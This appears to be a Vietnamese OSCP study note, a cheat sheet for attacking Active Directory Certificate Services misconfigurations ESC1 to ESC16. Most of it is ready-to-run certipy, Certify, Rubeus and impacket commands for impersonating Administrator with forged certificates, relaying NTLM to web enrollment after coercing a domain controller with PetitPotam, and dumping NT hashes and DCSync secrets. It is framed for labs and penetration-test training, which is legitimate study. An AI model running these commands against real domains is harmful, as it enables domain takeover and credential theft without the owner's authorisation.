# 05 — Active Directory Certificate Services (ADCS)

**Giải thích tổng quan:** ADCS là PKI của Microsoft. Nếu một **certificate
template** (mẫu chứng chỉ) bị cấu hình sai, một user thường có thể xin chứng chỉ
đại diện cho user khác (kể cả Domain Admin), rồi dùng chứng chỉ đó xác thực qua
PKINIT để lấy TGT / NT hash. Đây là một trong những đường ngắn nhất tới DA trong
OSCP hiện nay → **luôn chạy `certipy find` khi có credential**.

Các cấu hình sai được đánh số ESC1…ESC16. Dưới đây là những cái hay gặp nhất
trong lab.

---

## 0. Enumerate

```bash
# Kali — tìm template có lỗ hổng
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -vulnerable
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout            # tất cả
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -bloodhound        # xuất cho BloodHound
nxc ldap $DC -u $USER -p $PASS -M adcs                               # có CA không + tên CA
```

```powershell
PS> .\Certify.exe find /vulnerable
PS> certutil -TCAInfo ; certutil -CATemplates
```

Trong output certipy, chú ý dòng `[!] Vulnerabilities` của mỗi template
(`ESC1`, `ESC2`…). Ghi lại **CA name**, **template name**, **dnsHostname của CA**.

Đặt biến:

```bash
export CA='corp-DC01-CA' TEMPLATE='VulnTemplate' CAHOST='dc01.corp.local'
```

---

## 1. ESC1 — Template cho phép đặt SAN tùy ý

**Điều kiện:** template cho phép client cung cấp `subjectAltName` (SAN), EKU cho
Client Authentication, và user thường được quyền enroll.

**Ý tưởng:** xin chứng chỉ nhưng khai SAN = `administrator@corp.local` → chứng
chỉ "là" Administrator → PKINIT.

```bash
# 1) Xin chứng chỉ mạo danh Administrator
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca "$CA" -template "$TEMPLATE" -upn administrator@$DOMAIN
#   → administrator.pfx

# 2) Dùng chứng chỉ lấy TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC
#   → in TGT (.ccache) và NT hash của Administrator

# 3) Dùng hash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass $CAHOST
nxc smb $DC -u administrator -H <nthash>
```

```powershell
PS> .\Certify.exe request /ca:CORP-DC01-CA /template:VulnTemplate /altname:administrator
PS> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials
```

**Lab:** HTB *Authority*, PG *Nagoya* (ESC1), Vulnlab *Intercept*, HTB Academy
ADCS.

---

## 2. ESC2 / ESC3

- **ESC2:** template có EKU `Any Purpose` (hoặc không có EKU) → chứng chỉ dùng
  được cho mọi mục đích, bao gồm client auth. Khai thác như ESC1 nhưng không cần
  đặt SAN (hoặc dùng để ký như CA phụ).
- **ESC3:** template cấp **Enrollment Agent** → xin "on behalf of" user khác.

```bash
# ESC3: lấy enrollment agent rồi xin chứng chỉ thay cho Administrator
certipy req -u $USER@$DOMAIN -p $PASS -ca "$CA" -template "EnrollmentAgent"
certipy req -u $USER@$DOMAIN -p $PASS -ca "$CA" -template "User" -on-behalf-of "$DOMAIN\\administrator" -pfx enrollmentagent.pfx
certipy auth -pfx administrator.pfx -dc-ip $DC
```

---

## 3. ESC4 — Quyền ghi trên template

**Điều kiện:** bạn có GenericWrite/WriteDacl… trên object template.

**Ý tưởng:** **sửa template** cho dễ bị ESC1 (bật SAN, hạ yêu cầu), khai thác,
rồi khôi phục cấu hình cũ.

```bash
certipy template -u $USER@$DOMAIN -p $PASS -template "$TEMPLATE" -save-old    # lưu cấu hình cũ (để cleanup)
certipy template -u $USER@$DOMAIN -p $PASS -template "$TEMPLATE" -write-default-configuration
# giờ template như ESC1 → req với -upn administrator
certipy req -u $USER@$DOMAIN -p $PASS -ca "$CA" -template "$TEMPLATE" -upn administrator@$DOMAIN
# cleanup:
certipy template -u $USER@$DOMAIN -p $PASS -template "$TEMPLATE" -configuration <file_cũ>.json
```

**Lab:** HTB *Certified* (ESC4 → ESC... → DA), GOAD.

---

## 4. ESC6 — CA bật cờ EDITF_ATTRIBUTESUBJECTALTNAME2

Giống ESC1 nhưng lỗi nằm ở **CA** (cho phép SAN trên mọi template). Khai thác:
xin chứng chỉ bất kỳ template client-auth với `-upn administrator`.

```bash
certipy req -u $USER@$DOMAIN -p $PASS -ca "$CA" -template User -upn administrator@$DOMAIN
```

---

## 5. ESC8 — NTLM Relay tới ADCS Web Enrollment (HTTP)

**Điều kiện:** CA bật giao diện web `http://ca/certsrv/` và chấp nhận NTLM.

**Ý tưởng:** ép một máy (ví dụ DC bằng PetitPotam/PrinterBug) xác thực tới bạn,
**relay** sang web enrollment để xin chứng chỉ **máy đó** → có chứng chỉ của
`DC01$` → DCSync.

```bash
# 1) Relay tới ADCS, xin template cho DC
sudo impacket-ntlmrelayx -t http://$CAHOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 2) Ép DC xác thực (file 01 §8)
python3 PetitPotam.py -u $USER -p $PASS -d $DOMAIN $LHOST $DC
#   hoặc:  python3 printerbug.py $DOMAIN/$USER:$PASS@$DC $LHOST
# 3) ntlmrelayx in ra base64 cert của DC01$ → dùng:
certipy auth -pfx dc01.pfx -dc-ip $DC               # lấy TGT/hash DC01$
impacket-secretsdump -k -no-pass -just-dc $DC
```

**Lab:** THM *Breaching AD*, GOAD, HTB Academy ADCS; biến thể của chuỗi
PetitPotam cổ điển.

---

## 6. ESC9 / ESC10 / ESC11 / ESC13 / ESC15 / ESC16 (tóm tắt)

| ESC | Lỗi | Khai thác ngắn gọn |
|-----|-----|--------------------|
| ESC9 | Template có `CT_FLAG_NO_SECURITY_EXTENSION` (không nhúng SID) | Kết hợp quyền đổi `userPrincipalName` của user khác → xin cert → mạo danh |
| ESC10 | Registry CA map yếu (weak cert mapping) | Đổi UPN rồi auth như ESC9 |
| ESC11 | RPC enrollment (ICPR) không bắt buộc ký | Relay NTLM sang `-t rpc://CA` (certipy relay) |
| ESC13 | Template gắn OID → nhóm đặc quyền (issuance policy) | Xin cert có OID đó → được quyền nhóm |
| ESC15 (CVE-2024-49019) | "EKUwu" — template V1 cho phép thêm EKU/SAN qua CSR | `certipy req ... -application-policies 'Client Authentication'` |
| ESC16 | CA bỏ qua security extension toàn cục | Như ESC9 phạm vi toàn CA |

certipy ≥ 4.8 có thể tự phát hiện và kèm gợi ý khai thác trong `find -vulnerable`.

---

## 7. Dùng chứng chỉ để làm gì

```bash
# Có .pfx → lấy TGT và NT hash
certipy auth -pfx user.pfx -dc-ip $DC
# → "Got hash for 'user@corp.local': aad3b...:<nthash>"  và  user.ccache

# Dùng TGT
export KRB5CCNAME=user.ccache
nxc smb $DC --use-kcache
evil-winrm -i $DC -r CORP.LOCAL

# Chứng chỉ máy (DC01$) → DCSync
impacket-secretsdump -k -no-pass -just-dc-ntlm $DC
```

> **PKINIT bị tắt?** Dùng kỹ thuật "UnPAC-the-hash" của certipy (`certipy auth`
> vẫn lấy được hash qua U2U) hoặc dùng cert cho LDAP schannel
> (`certipy auth -pfx x.pfx -ldap-shell`).

---

## Checklist ADCS

- [ ] `certipy find -vulnerable` ngay khi có credential
- [ ] Có ESC1/4/6 → `certipy req -upn administrator` → `certipy auth`
- [ ] Có web enrollment (`/certsrv`) + coerce được → ESC8 relay
- [ ] Ghi được template → ESC4
- [ ] Lưu cấu hình cũ trước khi sửa (cleanup)
- [ ] `.pfx` → `certipy auth` → hash/TGT → secretsdump/DCSync
